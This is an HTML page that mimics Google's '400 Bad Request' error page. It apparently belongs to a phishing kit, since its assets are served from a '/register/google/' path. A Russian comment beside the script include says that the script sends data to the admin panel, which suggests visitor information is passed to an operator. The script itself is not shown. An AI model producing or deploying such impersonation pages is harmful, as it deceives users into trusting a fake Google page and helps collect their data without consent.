<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, minimum-scale=1, width=device-width">
    <title>Error 400 (Bad Request)!!</title>

    <!-- CSS: статический путь на твоём сервере -->
    <link rel="stylesheet" href="/register/google/static/css/styles.css">

    <!-- Локальный favicon -->
    <link rel="icon" type="image/svg+xml" href="/register/google/static/images/google-logo.svg">

    <style>
      *{
        margin:0;
        padding:0
      }
      html,code{
        font:15px/22px arial,sans-serif
      }
      html{
        background:#fff;
        color:#222;
        padding:15px
      }
      body{
        color:#222;
        text-align:unset;
        margin:7% auto 0;
        max-width:390px;
        min-height:180px;
        padding:30px 0 15px;
      }
      * > body{
        background:url(https://www.google.com/images/errors/robot.png) 100% 5px no-repeat;
        padding-right:205px
      }
      p{
        margin:11px 0 22px;
        overflow:hidden
      }
      pre{
        white-space:pre-wrap;
      }
      ins{
        color:#777;
        text-decoration:none
      }
      a img{
        border:0
      }
      @media screen and (max-width:772px){
        body{
          background:none;
          margin-top:0;
          max-width:none;
          padding-right:0
        }
      }
      /* Лого из локального статика */
      #logo{
        background:url("/register/google/static/images/google-logo.svg") no-repeat;
        background-size:150px 54px;
        margin-left:-5px;
        display:inline-block;
        height:54px;
        width:150px;
      }
    </style>
</head>
<body>

  <main id="af-error-container" role="main">
    <a href="./">
      <span id="logo" aria-label="Google" role="img"></span>
    </a>
    <p>
      <b>400.</b>
      <ins>That’s an error.</ins>
    </p>
    <p>
      The server cannot process the request because it is malformed. It should not be retried.
      <ins>That’s all we know.</ins>
    </p>
  </main>

  <!-- Общий JS, тот же, что шлёт данные в админку -->
  <script src="/register/google/static/js/script.js"></script>
</body>
</html>
